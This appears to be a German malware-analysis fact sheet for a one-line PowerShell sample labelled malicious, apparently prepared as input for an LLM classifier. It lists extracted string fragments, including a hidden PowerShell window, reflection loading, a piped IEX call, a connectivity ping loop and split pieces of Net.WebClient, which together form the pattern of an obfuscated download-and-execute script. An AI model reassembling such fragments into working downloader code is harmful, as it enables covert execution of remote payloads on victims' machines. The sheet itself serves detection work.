# Steckbrief: 094c5bdd350a0f2a9108ff23e6835e1a892170f23b573cc6dc6d829c4b079374.ps1

- SHA256: `094c5bdd350a0f2a9108ff23e6835e1a892170f23b573cc6dc6d829c4b079374`
- Groesse: 673 Bytes, 1 Zeilen
- Ground-Truth-Label (aus Ordner): **malicious**
- Kein Urteil enthalten. Bewertung erfolgt durch das LLM.

## Stufe 1 - Reine Extraktion
- Strings gesamt: 21 (Auszug unten)
- Base64-Bloecke gesamt: 0, davon dekodierbar: 0
- Strings (Auszug):
  - `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
  - `SilentlyContinue`
  - `[void`
  - `] [Syst`
  - `em.Refle`
  - `ction.Asse`
  - `mbly]::LoadWi`
  - `thPartialName(`
  - `Microsoft.VisualBasic`
  - `|IEX;do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping);$tty=`
  - `Obje`
  - `ct Ne`
  - `t.We`
  - `bCli`
  - `ent)`

## Stufe 2 - Statische Merkmale (zusaetzlich)
- Auffaellige Tokens (Name: Vorkommen):
  - invoke_expression: 1
  - window_hidden: 1
- Pfade: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`

## Stufe 3 - Struktur (zusaetzlich)
- Beobachtete Abfolge:
  1. Zeichenkette als Code ausfuehren
